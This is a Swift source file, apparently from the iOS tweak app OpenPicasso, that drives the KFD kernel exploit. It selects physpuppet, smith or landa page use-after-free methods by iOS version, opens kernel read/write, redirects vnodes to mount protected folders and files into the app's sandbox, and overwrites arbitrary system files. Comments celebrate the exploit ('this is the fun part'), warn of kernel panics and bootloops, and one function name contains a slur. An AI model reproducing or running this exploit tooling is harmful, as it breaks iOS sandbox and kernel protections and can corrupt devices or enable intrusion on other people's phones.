//
//  MacDirtyCowSwift.swift
//  MacDirtyCowSwift
//
//  Created by sourcelocation on 08/02/2023.
//

import Foundation
import UIKit

import URLBackport

/// `KFDSwift`: Use KFD from Swift with ease.
public class KFD {
    
    /// do black magic. returns url which you can use for other tomfoolery.
    public static func mountFolderAtURL(_ url: URL, mountURL: URL = .Backport.documentsDirectory.appendingPathComponent("mountedFolders").appendingPathComponent(UUID().uuidString)) throws -> (mountURL: URL, orig_to_v_data: UInt64) {
        #if targetEnvironment(simulator)
        try FileManager.default.createSymbolicLink(at: mountURL, withDestinationURL: url) // sim is already unsandboxed, move on
        return (mountURL, 0)
        #else
        
        print("[VnodeRedirect] Redirecting \(url.path)")
        
        let fm: FileManager = .default
        
        // MARK: - Mount folder prep
        
        print("[VnodeRedirect] Making mount folder at \(mountURL.path)")
        
        if fm.fileExists(atPath: mountURL.path) { // for the chance that an identical uuid gets produced twice (1/3.4028237*10^38, according to chatgpt)
            print("[VnodeRedirect] uuid got done twice??? thats weird and concerning")
            throw "That's weird and concerning." // - V, 3071 (colourized)
        } else {
            do {
                try fm.createDirectory(at: mountURL, withIntermediateDirectories: true)
            } catch {
                throw error
            }
        }
        
        // MARK: - Exploit (this is the fun part)
        print("[VnodeRedirect] Exploiting (this is the fun part)")
        let originVnode: UInt64 = getVnodeAtPathByChdir(strdup((url.path as NSString).utf8String)) // get vnode of original folder (featuring some weird cstring shenanigans)
        print("[VnodeRedirect] Got origin vnode: \(originVnode)!")

        let destinationVnode: UInt64 = getVnodeAtPathByChdir(strdup((mountURL.path as NSString).utf8String)) // get vnode of destination folder
        print("[VnodeRedirect] Got destination vnode: \(destinationVnode)!")
        
        print("[VnodeRedirect] Mounting...")
        let orig_to_v_data: UInt64 = funVnodeRedirectVnodeFromVnode(destinationVnode, originVnode) // finally, redirect folder with krw magic.
        
        print("[VnodeRedirect] Probably mounted directory \(url.path) at \(mountURL.path) (orig_to_v_data: \(orig_to_v_data))! If device hasn't panicked yet, congrats!") // print info
        return (mountURL, orig_to_v_data) // return url
        #endif
    }
    
    /// even more black magic. returns url which you can use for other tomfoolery.
    public static func mountFileAtURL(_ url: URL, mountURL: URL = .Backport.documentsDirectory.appendingPathComponent("mountedFiles").appendingPathComponent(UUID().uuidString)) throws -> (mountURL: URL, orig_to_v_data: UInt64) {
        
        print("[VnodeRedirect] Redirecting \(url.path)")
        
        let fm: FileManager = .default
        
        // MARK: - Mount file prep
        
        print("[VnodeRedirect] Making mount file at \(mountURL.path)")
        
        if fm.fileExists(atPath: mountURL.path) { // for the chance that an identical uuid gets produced twice (1/3.4028237*10^38, according to chatgpt)
            print("[VnodeRedirect] uuid got done twice??? thats weird and concerning")
            throw "That's weird and concerning." // - V, 3071 (colourized)
        } else {
            fm.createFile(atPath: mountURL.path, contents: nil)
        }
        
        // MARK: - Exploit (this is the fun part)
        print("[VnodeRedirect] Exploiting (this is the fun part)")
        
        let originVnode: UInt64 = getVnodeAtPath(strdup((url.path as NSString).utf8String)) // get vnode of original folder (featuring some weird cstring shenanigans)
        print("[VnodeRedirect] Got origin vnode: \(originVnode)!")
        
        let destinationVnode: UInt64 = getVnodeAtPath(strdup((mountURL.path as NSString).utf8String)) // get vnode of destination folder
        print("[VnodeRedirect] Got destination vnode: \(destinationVnode)!")
        
        print("[VnodeRedirect] Mounting...")
        let orig_to_v_data: UInt64 = funVnodeRedirectVnodeFromVnode(destinationVnode, originVnode) // finally, redirect folder with krw magic.
        
        print("[VnodeRedirect] Probably mounted file \(url.path) at \(mountURL.path) (orig_to_v_data: \(orig_to_v_data))! If device hasn't panicked yet, congrats!") // print info
        return (mountURL, orig_to_v_data) // return url
    }
    
    public static func unmountFileAtURL(mountURL: URL, orig_to_v_data: UInt64) throws {
//        print("[VnodeUnredirect] Unredirecting file/folder at \(mountURL.path)")
        var mountVnode: UInt64? = nil
//        print("[VnodeUnredirect] Getting vnode of mount url")
        if mountURL.hasDirectoryPath || (try? mountURL.resourceValues(forKeys: [.isSymbolicLinkKey]))?.isSymbolicLink ?? false {
            mountVnode = getVnodeAtPathByChdir(strdup((mountURL.path as NSString).utf8String)) // use chdir method to prevent panic
        } else {
            mountVnode = getVnodeAtPath(strdup((mountURL.path as NSString).utf8String))
        }
        
//        print("[VnodeUnredirect] Got vnode of \(mountVnode ?? 0)!")
        
        if mountVnode != nil {
//            print("[VnodeUnredirect] Exploiting (this is the fun part)")
            funVnodeUnRedirectVnode(mountVnode! /* it can't be nil at this point */, orig_to_v_data) // unredirect folder
        } else {
            throw "That's weird and concerning." // - V, 3071 (colourized)
        }
        
//        print("[VnodeUnredirect] Unmounted \(mountURL.path)! If device hasn't panicked yet, congrats!")
    }
    
    
    public enum KFDOverwriteError: Error, LocalizedError {
        case unknown
        case ram
        case corruption
        
        public var errorDescription: String? {
            switch self {
            case .unknown:
                return "KFD exploit failed. Restart the app and try again."
            case .ram:
                return "OpenPicasso ran out of memory and for your safety disabled overwriting files using KFD. Please close some apps running in background, reopen OpenPicasso and try again."
            case .corruption:
                return "⚠️IMPORTANT⚠️\nKFD corrupted an asset catalog. This will lead to a bootloop if the steps are not followed. FOLLOW CAREFULLY: Close all your background apps, then reopen OpenPicasso for fixing. Then you can try again."
            }
        }
    }
    
    public static var isKFDSafe: Bool = true
    
    public static var kfd: UInt64 = 0
    public static var puaf_pages_options = [16, 32, 64, 128, 256, 512, 1024, 2048, 65536]
    public static var puaf_pages_index = 7
    public static var puaf_pages = 0
    
    public static var puaf_method_options = ["physpuppet", "smith", "landa"]
    
    public static var puaf_method: Int = pickPUAFMethodForMeBecauseImTooRetardedToRead()
    
    public static var kread_method_options = ["kqueue_workloop_ctl", "sem_open"]
    public static var kread_method = 1
    
    public static var kwrite_method_options = ["dup", "sem_open"]
    public static var kwrite_method = 1
    
    private static func pickPUAFMethodForMeBecauseImTooRetardedToRead() -> Int {
        if #available(iOS 16.6, *) {
            return 2 // landa
        } else {
            return 1 // smith
        }
    }
    
    public static func getCompatiblePUAFMethods() -> [String] {
        let largeVer = ProcessInfo.processInfo.operatingSystemVersionString
        let verComponents = largeVer.components(separatedBy: ["(", " ", ")"])
        
        if #unavailable(iOS 16.0) {
            // 15.x
            return []
        }
        
        if #available(iOS 17.0, *) {
            // 17.x
            return []
        }
        
        if #available(iOS 16.4, *) {
            if #available(iOS 16.5.1, *) {
                if UIDevice.current.systemVersion == "16.6", verComponents.count >= 4, verComponents[4] == "20G5026e" {
                    // 16.6b1
                    return ["smith", "landa"]
                } else {
                    // 16.5.1/16.6rc+
                    return ["landa"]
                }
            } else {
                // 16.4-16.5.0
                return ["smith", "landa"]
            }
        } else {
            // 16.0-16.3
            return ["physpuppet", "smith", "landa"]
        }
    }
    
    public static func kopen() {
//        if e.components(separatedBy: ".")[0] == "physpuppet" {
//            puaf_pages_options.append(contentsOf: s)
//            puaf_pages_options.append(65536) // m1
            print("[KFD] \(puaf_pages_options.count)")
            print("[KFD] \(puaf_pages_index)")
            puaf_pages = puaf_pages_options[puaf_pages_index]
            kfd = do_kopen(UInt64(puaf_pages), UInt64(puaf_method), UInt64(kread_method), UInt64(kwrite_method))
            print("[KFD] kfd = \(kfd)")
            do_fun()
//        }
    }
    
    /// Safely closes KFD.
    public static func kclose() {
        do_kclose()
    }
    
    /// Overwrite a file with any data.
    /// unlockDataAtEnd - Unlocked the data at overwrite end. Used when replacing files inside app bundle
    public static func overwriteFile(at url: URL, with data: Data, unlockDataAtEnd: Bool = false, multipleIterations: Bool = false) throws {
        print("[KFD] attempting to write at \(url)")
        let cPathTo = url.path.withCString { ptr in
            return strdup(ptr)
        }
        let tmpURL = URL.backport.temporaryDirectory.appendingPathComponent("tmp", conformingTo: .directory)
        
        try data.write(to: tmpURL)
        
        let cPathFrom = tmpURL.path.withCString { ptr in
            return strdup(ptr)
        }

        if TARGET_OS_SIMULATOR == 1 {
            try data.write(to: url)
        } else {
            funVnodeOverwrite2(cPathTo!, cPathFrom)
        }

        // remove tmp file
        try FileManager.default.removeItem(at: tmpURL)
    }
    
    /// Overwrite a file with the data of another file.
    /// unlockDataAtEnd - Unlocked the data at overwrite end. Used when replacing files inside app bundle
    public static func overwriteFile(at url: URL, withFileAtURL: URL, unlockDataAtEnd: Bool = false, multipleIterations: Bool = false) throws {
        print("[KFD] attempting to write at \(url.path)")
        let cPathTo = url.path.withCString { ptr in
                return strdup(ptr)
            }
        let cPathFrom = withFileAtURL.path.withCString { ptr in
            return strdup(ptr)
        }
        
        if TARGET_OS_SIMULATOR == 1 {
            try FileManager.default.copyItem(at: withFileAtURL, to: url)
        } else {
            funVnodeOverwrite2(cPathTo!, cPathFrom)
        }
    }
    
    public static func mounted(_ path: String) -> URL {
        return URL.backport.documentsDirectory.appendingPathComponent("mounted/").appendingPathComponent(path)
    }
    
    private static var orig_to_v_data: UInt64 = 0
//    public static func mountVar() {
//        let var_vnode = getVnodeVar()
//        print("[KFD] / vnode: \(var_vnode)");
//        orig_to_v_data = createFolderAndRedirect(var_vnode);
//    }
//    public static func unmountVar() {
//        UnRedirectAndRemoveFolder(orig_to_v_data);
//    }
}


//extension String: LocalizedError {
//    public var errorDescription: String? { return self }
//}

